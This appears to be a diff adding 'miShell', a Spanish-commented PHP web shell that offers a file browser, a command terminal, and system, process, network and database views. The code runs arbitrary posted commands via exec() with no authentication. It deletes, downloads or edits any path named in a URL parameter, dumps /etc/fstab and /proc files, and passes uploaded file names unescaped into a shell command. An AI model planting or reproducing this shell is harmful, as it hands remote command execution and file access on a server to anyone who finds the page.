@@ -1,0 +1,835 @@
+<?php
+
+/**
+ * miShell
+ * Copyright (C) 2014 Esteban De La Fuente Rubio, DeLaF (esteban[at]delaf.cl)
+ *
+ * Este programa es software libre: usted puede redistribuirlo y/o modificarlo
+ * bajo los términos de la Licencia Pública General GNU publicada
+ * por la Fundación para el Software Libre, ya sea la versión 3
+ * de la Licencia, o (a su elección) cualquier versión posterior de la misma.
+ *
+ * Este programa se distribuye con la esperanza de que sea útil, pero
+ * SIN GARANTÍA ALGUNA; ni siquiera la garantía implícita
+ * MERCANTIL o de APTITUD PARA UN PROPÓSITO DETERMINADO.
+ * Consulte los detalles de la Licencia Pública General GNU para obtener
+ * una información más detallada.
+ *
+ * Debería haber recibido una copia de la Licencia Pública General GNU
+ * junto a este programa.
+ * En caso contrario, consulte <http://www.gnu.org/licenses/gpl.html>.
+ *
+ */
+
+/**
+ * miShell
+ * Herramienta para exploración y realización de diferentes tareas en
+ * servidores corriendo Linux, Apache y PHP
+ * @author Esteban De La Fuente Rubio, DeLaF (esteban[at]delaf.cl)
+ * @version 2014-01-27
+ */
+
+// configuración
+$conf = array (
+	'time' => array (
+		'zone' => 'America/Santiago',
+		'format' => 'Y-m-d H:i:s',
+	),
+	'menu' => 'browser terminal system users process network php databases',
+	'jquery' => 'http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.min.js',
+);
+
+// definir zona horaria
+date_default_timezone_set($conf['time']['zone']);
+
+// definir PATH
+putenv("PATH={$_SERVER["PATH"]}:/usr/bin:/usr/local/bin");
+
+// generar hojas de estilo en cascada
+if(isset($_GET['css'])) {
+	header('Content-type: text/css');
+	echo css();
+}
+// generar codigo javascript
+else if(isset($_GET['js'])) {
+	header('Content-type: application/javascript');
+	echo js();
+}
+// generar imagen
+else if(isset($_GET['img'])) {
+	$img = img_load();
+	header('Content-type: image/png');
+	echo base64_decode($img[$_GET['img']]);
+}
+// generar vista de terminal
+else if(isset($_GET['terminal'])) {
+	echo web1();
+	echo '<h1>Terminal</h1>'."\n";
+	echo terminal();
+	echo web2();
+}
+// generar vista de usuarios
+else if(isset($_GET['system'])) {
+	echo web1();
+	echo '<h1>System</h1>'."\n";
+	echo execute('df -h');
+	echo execute('free -m');
+	echo file_show('/etc/fstab');
+	echo file_show('/proc/cpuinfo');
+	echo file_show('/proc/meminfo');
+	echo web2();
+}
+// generar vista de usuarios
+else if(isset($_GET['users'])) {
+	echo web1();
+	echo users();
+	echo web2();
+}
+// generar vista de procesos
+else if(isset($_GET['process'])) {
+	echo web1();
+	echo process();
+	echo web2();
+}
+// generar vista de red
+else if(isset($_GET['network'])) {
+	echo web1();
+	echo network();
+	echo web2();
+}
+// generar vista de php
+else if(isset($_GET['php'])) {
+	echo web1();
+	echo php();
+	echo web2();
+}
+// generar phpinfo
+else if(isset($_GET['phpinfo'])) {
+	phpinfo();
+}
+// generar vista de base de datos
+else if(isset($_GET['databases'])) {
+	echo web1();
+	echo databases();
+	echo web2();
+}
+// eliminar archivo
+else if(isset($_GET['delete'])) {
+	file_delete(urldecode($_GET['delete']));
+}
+// generar editor
+else if(isset($_GET['edit'])) {
+	file_edit(urldecode($_GET['edit']));
+}
+// generar descarga
+else if(isset($_GET['download'])) {
+	file_download(urldecode($_GET['download']));
+}
+// generar pagina principal
+else {
+	echo web1();
+	echo browser();
+	echo web2();
+}
+
+/**
+ *
+ */
+function web1($logo_info_nav = true) {
+	global $conf;
+	$jquery = $conf['jquery'];
+	$buffer = <<< EOF
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+	<head>
+		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+		<title>~~miShell~~</title>
+		<link rel="shortcut icon" href="?img=shell" />
+		<link rel="stylesheet" type="text/css" href="?css" media="screen" title="screen" />
+		<script type="text/javascript" src="$jquery"></script>
+		<script type="text/javascript" src="?js"></script>
+	</head>
+	<body>
+		<div id="overlay"></div>
+		<div id="windows"></div>
+		<div id="page">
+
+EOF;
+	if($logo_info_nav) {
+		$buffer .= logo_info();
+		$buffer .= nav();
+	}
+	return $buffer;
+}
+
+function web2() {
+	$buffer = <<< EOF
+		<div id="footer">
+			<span>~~miShell~~</span>
+			by <a href="http://delaf.cl">DeLaF</a>
+		</div>
+		</div>
+	</body>
+</html>
+EOF;
+	return $buffer;
+}
+
+function logo_info () {
+	// generar logo e información general
+	$uname = php_uname();
+	$uptime = uptime();
+	$phpversion = phpversion();
+	$phpapi = php_sapi_name();
+	$apache = $_SERVER['SERVER_SOFTWARE'];
+	$user = posix_getpwuid(posix_getuid());
+	$prompt = $user['name'].'@'.gethostname();
+	$document_root = $_SERVER['DOCUMENT_ROOT'];
+	$document_root_link = urlencode($_SERVER['DOCUMENT_ROOT']);
+	$script_dir = getcwd();
+	$script_dir_link = urlencode(getcwd());
+	$buffer = <<< EOF
+			<div id="logo" class="fleft">~~miShell~~</div>
+			<div id="generalInfo" class="fright">
+				$uname<br />
+				Uptime: $uptime<br />
+				PHP $phpversion with $phpapi on $apache<br />
+				$prompt:<a href="?dir=$script_dir_link">$script_dir</a><br />
+				DocumentRoot: <a href="?dir=$document_root_link">$document_root</a><br />
+			</div>
+			<div class="clear"></div>
+EOF;
+	return $buffer;
+}
+
+function nav() {
+	global $conf;
+	$entries = explode(' ', $conf['menu']);
+	$buffer = '';
+	$buffer .= '<div id="nav">'."\n";
+	foreach($entries as &$entry)
+		$buffer .= '<a href="?'.$entry.'">'.$entry.'</a>'."\n";
+	$buffer .= '</div>'."\n";
+	return $buffer;
+}
+
+function css() {
+	$buffer = <<< EOF
+* { top: 0; left: 0; }
+body { background: black; color: white; font-family: monospace; }
+a { color: orange; text-decoration: none; }
+a:hover { color: red; text-decoration: underline; }
+pre { background: #aaa; color: black; padding: 10px; border: 2px solid #555; }
+table { width: 100%; }
+th { background: #333; }
+tr { background: #aaa; }
+tr:hover { background: #ccc; }
+td { text-align: center; color: black; }
+td a{ color: black; }
+iframe { width: 100%; height: 300px; }
+img.disabled { filter: alpha(opacity=30); -moz-opacity: 0.3; opacity: 0.3; }
+textarea { width: 100%; height: 200px; }
+.clear { clear: both; }
+.fleft { float: left; }
+.fright { float: right; }
+.center { text-align: center; }
+#logo { background: #222; color: yellow; font-size: 2em; width: 300px; padding: 20px; border: 5px solid #555; text-align: center; }
+#nav, #footer { text-align: center; background: #222; border: 2px solid #555; margin: 10px 0; padding: 2px; }
+#footer span { color: yellow; }
+/** Estilo para "ventanas" dentro del navegador */
+#overlay { display: none; position: fixed; height: 100%; width: 100%; background: black; opacity: .85; filter: alpha(opacity=85); -moz-opacity: .85; z-index: 101; }
+.window { display: none; position: fixed; background: black; z-index: 102; }
+.window_normal { width: 600px; height: 400px; top: 50%; left: 50%; margin-left: -300px; margin-top: -200px; border: 4px solid #333; }
+.window_maximize { height: 100%; width: 100%; }
+.window .windowbar { background: #333; font-weight: bold; font-size: 16px; }
+.window .windowbar .title { padding: 5px; }
+.window .windowbar .buttons a { font-size: 20px; color: #aaa; }
+.window .windowbar .buttons a:hover { color: #eee; text-decoration:none; }
+.window .windowbar .buttons .restore { display: none; }
+.window .content { padding: 5px; }
+.window .content iframe { border: 0; }
+EOF;
+	return $buffer;
+}
+
+function js() {
+	$buffer = <<< EOF
+/** Clases y funciones para manejar una "ventana" dentro del navegador */
+var windows = new Windows();
+function Windows () {
+	this.wid = 0;
+	this.windows = new Array();
+}
+Windows.prototype.createWindow = function () {
+	var id = this.wid++;
+	this.windows[id] = new Window('window_'+id);
+	return this.windows[id];
+}
+Windows.prototype.getWindow = function (id) {
+	var window;
+	this.windows.forEach(function(w) {
+		if (w.id == id) {
+			window = w;
+		}
+	});
+	return window;
+}
+function Window (id) {
+	// atributos de la clase
+	this.id = id;
+	this.title = id;
+	// crear ventana
+	$('#windows').append('<div id="'+this.id+'" class="window window_normal"><div class="windowbar"><div class="title fleft">'+this.title+'</div><div class="buttons fright"><a href="#" onclick="windows.getWindow(\''+this.id+'\').restore()" title="Restore" class="restore">-</a><a href="#" onclick="windows.getWindow(\''+this.id+'\').maximize()" title="Maximize" class="maximize">+</a><a href="#" onclick="windows.getWindow(\''+this.id+'\').close()" title="Close" class="close">x</a></div><div class="clear"></div></div><div class="content"></div><div>');
+}
+Window.prototype.setTitle = function (title) {
+	$('#'+this.id+' .title').text(title);
+}
+Window.prototype.setContent = function (content) {
+	$('#'+this.id+' .content').html(content);
+}
+Window.prototype.setIframe = function (src) {
+	// colocar iframe
+	this.setContent('<iframe src="'+src+'" id="'+this.id+'_iframe" />');
+	$('#'+this.id+' .content').css('padding', '0');
+	// cambiar el tamaño del iframe
+	$('#'+this.id+'_iframe').height($('#'+this.id).height()-30);
+}
+Window.prototype.show = function () {
+	$('#overlay').fadeIn(400);
+	$('#'+this.id).fadeIn(400);
+}
+Window.prototype.hide = function () {
+	$('#overlay').fadeOut(400);
+	$('#'+this.id).fadeOut(400);
+}
+Window.prototype.close = function () {
+	if(confirm('Are you sure you want to close this window?')) {
+		// ocultar ventana
+		this.hide();
+		// eliminar ventana del arreglo
+		var parts = this.id.split('_');
+		windows.windows.splice(parts[1],1);
+		// eliminar ventana del div windows
+		$('#'+this.id).remove();
+	}
+}
+Window.prototype.maximize = function () {
+	// recuperar objetos (ventana y botones)
+	var window = $('#'+this.id);
+	var buttons = $('#'+this.id+' .buttons');
+	// agrandar ventana
+	window.removeClass('window_normal').addClass('window_maximize');
+	// cambiar botones
+	buttons.children('.maximize').css('display', 'none');
+	buttons.children('.restore').css('display', 'inline');
+	// cambiar el tamaño del iframe
+	if($('#'+this.id+'_iframe')) {
+		$('#'+this.id+'_iframe').height($('#'+this.id).height()-30);
+	}
+}
+Window.prototype.restore = function () {
+	// recuperar objetos (ventana y botones)
+	var window = $('#'+this.id);
+	var buttons = $('#'+this.id+' .buttons');
+	// restaurar ventana
+	window.removeClass('window_maximize').addClass('window_normal');
+	// cambiar botones
+	buttons.children('.restore').css('display', 'none');
+	buttons.children('.maximize').css('display', 'inline');
+	// cambiar el tamaño del iframe
+	if($('#'+this.id+'_iframe')) {
+		$('#'+this.id+'_iframe').height($('#'+this.id).height()-30);
+	}
+}
+
+/** Función para editar archivo */
+function file_edit (file) {
+	var window = windows.createWindow();
+	window.setTitle('Text editor');
+	window.setIframe('?edit='+file);
+	window.show();
+}
+
+/** Función para eliminar archivo */
+function file_delete (file) {
+	if(confirm('Are you sure you want to delete this file?')) {
+		document.location.href = '?delete='+file;
+	}
+}
+
+/** Función para seleccionar y deseleccionar todos los elementos en los archivos */
+function browser_selectAll () {
+	if($('#browserSelectAll').is(":checked")) {
+		$('.browseFiles').attr("checked","checked");
+	} else {
+		$('.browseFiles').removeAttr("checked");
+	}
+}
+
+EOF;
+
+	return $buffer;
+}
+
+function img_load() {
+	return array(
+
+		'download' =>
+		'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACVElEQVR42pWSTUwTQRzF3+xyENNi
+		m/QLJKn1oxQCxoaDXBQPxoSkhijc5CCHXot44VIDBW4cajxwICQq9qLRaBMqXjQxxFSSVoyxlpMV
+		LUJF3HahpXQ/xt3SkiZYlX/yMvNP5v1m5s0QVClbQE8r+0QfR/60jlQDND820jajGVmhgM9pDvHe
+		9YMBOmYd1GU/i40cj3AyjreupYMBzs21096WS1jP/sLr5Qjmu6L/BjiDzYvKcKbcXzzeAW6bR3T1
+		U+Wy94vdcec+QCQS8efk7I2xtWEsFxJo1Jph1hggypJyDQ7JzRQscj368v0gO8xtt9s9uAdQzMdY
+		lk2cOtGCrJzFtTc9WOLjaKwzFeFJ/gfsGgem2wNgCyxmQ0+xtbVpGxoa+lIG3DUZLdeNBgtqagh4
+		IYPuly7E0h+LgBZdK550BqFhtchksoi+W0A0unDP5/P1E8WsU3bn1N2VEd9X19DQYMLP3AYuv+qC
+		ia3HoPEWaK4GtYcY2E/awG/yCASmFVhGrwJGjtTphxuPWvclTCktSpZlSIoEQUShICCfzyP0/Bli
+		sQ8+FcCJEtUxhIAoKqZSMhWNkqSYJchSab7XS+A4Lk3C4TBtbTtdNKveMqTaB0kJKQisAGutFZN3
+		JkFCoRA933kBcy/mwbAMWIbZhZESrOK1mx1WjCdHAQMw3jSGqdEpkJmZGXrlag/uPwjC0WRVgmTA
+		MKp2T4QSTC2t5jB8KyP4pvuKR86HmLg5AeL3+6nH48F2fue/rlBZAwMDIF6vlxNFUacIqspBqQGW
+		X+Evlf4N+MwXuEBYuXsAAAAASUVORK5CYII=',
+
+		'edit' =>
+		'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBI
+		WXMAAAsSAAALEgHS3X78AAAAB3RJTUUH1gkCDTgyeDqBQAAAAB10RVh0Q29tbWVudABDcmVhdGVk
+		IHdpdGggVGhlIEdJTVDvZCVuAAABp0lEQVQ4y42RvUtbURjGfzfECI0U6eIQFNLFrRCHLkIrWAX/
+		gYLk+oWDQ7OUQkgQ2qEEw8X+AaUgxNh2KIpLQLSCBEHQ4pAttEvNFM29mXJRDpy3Q416c68fD5zh
+		vIf39z7vcwyuNZy3cvvcr7FMevGnr5q3cqK19h2llCilxHVdUUpJ3spJ3sq9aveFOkGO42DbNnbD
+		ptFo4DQdfh0dsbVdon5a593bNMBOG+IDiAgigkbQIogW4k/jNJtNoo+i1E/rmMkZgB2AsA+ghZXC
+		F09t2pyjJ/qYjc0fuK5Lq9W6evMBtGhmpuYBgUsXWjSJxBAnJ3+JRCL0fH4JwLiJGQ5aoVBcufUL
+		xiuLDGag+/cLKuvlYiBgKjmLICD/722dZfuvmi8Oy9ySgab4rXDn5IvDMtUaAO8DMhCSk9OeWufk
+		ag3+9I3y+tPux3DQnl+/r3qn420eWFhl+6AG7BqBgJsOzrL9DK3BG3XOfBf0pko8eT4BB0vBGXQ6
+		yKzBsQm9qQ90xZ55wgbkXgedebRlGEawg1gsxkOktfYB9qzlpREeqFAotAfwD53h3AFtQ/QoAAAA
+		AElFTkSuQmCC',
+
+		'delete' =>
+		'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAA
+		LXRFWHRTb2Z0d2FyZQBDcmVhdGVkIGJ5IGZDb2RlciBHcmFwaGljIFByb2Nlc3NvcgCJbZBuAAAB
+		xElEQVR42qWTzUtCQRTFzxMptAjUR1mJECmaldimNBdB/0BB2yDI2raNNhFtwm1ri1pHkDtXUVDp
+		LivzA20jRWFPg0oK+5hmppx6WbTowjDvzj3nN5eZeVpCCP4T2r8Ef4UKcL6/Ty6WF2H0+GCfW5C+
+		i7NLC6QUj6J9Zh4Wv19SAapm26MOOSpi4q+QqpnXqQ6YJwwiAA/pDJ+13n446ZyO7+Jwepw0eodx
+		H9tG5fYaTs/Qu5jWuN7v/+zAHpiUsoU8Se9G0N07iG5rH4rFc1xtrMHcZoWJ5ijd4vTkAMahYa7n
+		G+JLsJZTZw8ktreD/k43DNDDINN+KsDrZQkpJY0mi/p8am6hKxSUNF4vucwdo9XmFusvySPc1UsY
+		iARVh/vjNSo3Zbga9Hi6K4g1DR26UrlGWwNITc3yl/XaKAM3T2Kd5+U8r7MufwSworK1CZfLwXOl
+		UkQhp6DZJkOuM8HZYkWS1lOAgAhAdmVVZU4mM5BHx2CeduA5muFGVmODfWd9DsJuQgB0znej5l5B
+		Il/kZtFqAHxXZuyxmlR6AeBPM7xOEiMTavNHsJxBEhTSEV6vfcpViEXJ4bfg0FBQtfbvv/ENSATD
+		ewE78YAAAAAASUVORK5CYII=',
+		
+		'shell' =>
+		'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'
+
+	);
+}
+
+function file_show($file, $h='h2') {
+	$buffer = '';
+	$buffer .= '<'.$h.'>'.$file.'</'.$h.'>'."\n";
+	$buffer .= '<pre>'."\n";
+	$buffer .=  file_get_contents($file);
+	$buffer .= '</pre>'."\n";
+	return $buffer;
+}
+
+function execute($cmd, $h = 'h2') {
+	exec($cmd, $output);
+	$buffer = '';
+	$buffer .= '<'.$h.'>'.$cmd.'</'.$h.'>'."\n";
+	$buffer .= '<pre>'."\n";
+	$buffer .=  implode("\n", $output);
+	$buffer .= '</pre>'."\n";
+	return $buffer;
+}
+
+// http://www.xenocafe.com/tutorials/php/realtime_server_uptime/index.php
+function uptime() {
+	$uptime = file_get_contents('/proc/uptime');
+	$uptime = explode(' ', $uptime);
+	$seconds = $uptime[0];
+	$secs = intval($seconds % 60);
+	$mins = intval($seconds / 60 % 60);
+	$hours = intval($seconds / 3600 % 24);
+	$days = intval($seconds / 86400);
+	$uptimeString = '';
+	if ($days > 0) {
+		$uptimeString .= $days;
+		$uptimeString .= (($days == 1) ? " day" : " days");
+	}
+	if ($hours > 0) {
+		$uptimeString .= (($days > 0) ? ", " : "") . $hours;
+		$uptimeString .= (($hours == 1) ? " hour" : " hours");
+	}
+	if ($mins > 0) {
+		$uptimeString .= (($days > 0 || $hours > 0) ? ", " : "") . $mins;
+		$uptimeString .= (($mins == 1) ? " minute" : " minutes");
+	}
+	if ($secs > 0) {
+		$uptimeString .= (($days > 0 || $hours > 0 || $mins > 0) ? ", " : "") . $secs;
+	$uptimeString .= (($secs == 1) ? " second" : " seconds");
+	}
+	return $uptimeString;
+}
+
+function terminal() {
+	$buffer = '';
+	$buffer .= '<script type="text/javascript"> $(function() { $(\'#cmd\').focus(); }); </script>'."\n";
+	$buffer .= '<form action="'.$_SERVER['REQUEST_URI'].'" method="post">'."\n";
+	$buffer .= '<input type="text" name="cmd" id="cmd" value="'.(!empty($_POST['cmd'])?$_POST['cmd']:'').'" style="width: 100%;" />'."\n";
+	$buffer .= '</form>'."\n";
+	if(!empty($_POST['cmd'])) {
+		$buffer .= execute($_POST['cmd']);
+	}
+	return $buffer;
+}
+
+function browser() {
+	global $conf;
+	// obtener directorio que se procesara
+	$dir = empty($_GET['dir']) ? '/' : urldecode($_GET['dir']);
+	if($dir[strlen($dir)-1]!='/') $dir .= '/';
+	// mkdir y touch
+	if(!empty($_POST['mkdir'])) mkdir($dir.$_POST['mkdir']);
+	if(!empty($_POST['touch'])) touch($dir.$_POST['touch']);
+	if(!empty($_POST['execute'])) execute('cd "'.$dir.'"; '.$_POST['execute']);
+	if(isset($_FILES['upload'])) execute('cp '.$_FILES['upload']['tmp_name'].' "'.$dir.$_FILES['upload']['name'].'"');
+	if(!empty($_POST['filesAction']) && isset($_POST['files']) && count($_POST['files'])) {
+		if($_POST['filesAction']=='download') {
+			file_download($_POST['files'], $dir);
+		} else {
+			foreach($_POST['files'] as &$file) {
+				file_delete($dir.$file);
+			}
+		}
+	}
+	// leer contenido del directorio
+	$files = scandir($dir);
+	// generar uri para navegacion por directorios padres
+	$aux = '';
+	$uri = '';
+	$to = 0;
+	$from = 0;
+	do {
+		$to = strpos ($dir, '/', $from);
+		$folder = substr($dir, $from, $to-$from+1);
+		$aux .= $folder;
+		$uri .= '<a href="?dir='.urlencode($aux).'">'.$folder.'</a>';
+		$from = $to+1;
+	} while($to!==false);
+	// mostrar directorio
+	$buffer = '';
+	$buffer .= '<h1>Browser</h1>'."\n";
+	$buffer .= '<form action="'.$_SERVER['REQUEST_URI'].'" method="post">'."\n";
+	$buffer .= '<div id="dirInfo">'.$uri.': '.size_format(disk_free_space($dir)).' free of '.size_format(disk_total_space($dir)).'</div>'."\n";
+	$buffer .= '<table>'."\n";
+	$selectAll = '<input type="checkbox" name="browserSelectAll" id="browserSelectAll" onclick="browser_selectAll()" />';
+	$buffer .= '<tr><th>file</th><th style="width: 100px;">inode</th><th style="width: 100px;">perms</th><th style="width: 100px;">user</th><th style="width: 100px;">group</th><th style="width: 100px;">size</th><th style="width: 200px;">date/time</th><th style="width: 100px;">actions</th><th style="width: 20px;">'.$selectAll.'</th></tr>'."\n";
+	foreach($files as &$file) {
+		if($file=='.' || $file=='..') continue;
+		// nombre del archivo
+		$name = is_dir($dir.$file) ? '<a href="?dir='.urlencode($dir.$file).'">'.$file.'</a>' : $file;
+		// propiedades del archivo
+		$user = posix_getpwuid(fileowner($dir.$file));
+		$group = posix_getgrgid(filegroup($dir.$file));
+		$mtime = date ($conf['time']['format'], filemtime($dir.$file));
+		// acciones
+		$actions = '';
+		if(is_readable($dir.$file)) $actions .= '<a href="?download='.urlencode($dir.$file).'" title="download"><img src="?img=download" alt="" /></a>';
+		else $actions .= '<img src="?img=download" alt="" class="disabled" />';
+		if(!is_dir($dir.$file) && is_readable($dir.$file)) $actions .= '<a href="#" onclick="file_edit(\''.urlencode($dir.$file).'\')" title="edit"><img src="?img=edit" alt="" /></a>';
+		else $actions .= '<img src="?img=edit" alt="" class="disabled" />';
+		if(is_writable($dir.$file)) $actions .= '<a href="#" onclick="file_delete(\''.urlencode($dir.$file).'\')" title="delete"><img src="?img=delete" alt="" /></a>';
